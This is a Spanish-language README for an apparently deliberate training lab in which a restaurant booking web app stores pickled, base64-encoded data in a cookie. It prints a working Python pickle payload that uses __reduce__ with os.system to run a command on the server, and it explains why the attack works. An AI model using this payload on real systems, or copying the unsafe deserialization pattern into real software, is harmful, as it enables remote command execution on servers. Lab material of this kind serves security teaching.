## 🚨 Deserialization Attack (Deserialization-Lab)
- Aplicación vulnerable a deserialización de datos en python (librería pickle).
- Se trata de una aplicación web para hacer reservas en un restaurante. 

Tras realizar una reserva, los datos viajan serializados y en base64 en una cookie. Posteriormente, los datos se deserializan para ser mostrados por pantalla.

Un atacante podria generar un payload malicioso como este para ejecutar comandos en el servidor:

```python
import pickle
import base64
import os

class MaliciousClass:
    def __reduce__(self):
        return (os.system, ('{comando a ejecutar}',))

malicious_object = MaliciousClass()

pickled_data = pickle.dumps(malicious_object)

base64_encoded_data = base64.b64encode(pickled_data).decode('utf-8')

print(base64_encoded_data)
```

Esto ocurre porque al deserializar los datos se llama al método **\_\_reduce\_\_**, el cual ejecuta comandos en el servidor con la llamada **os.system()**.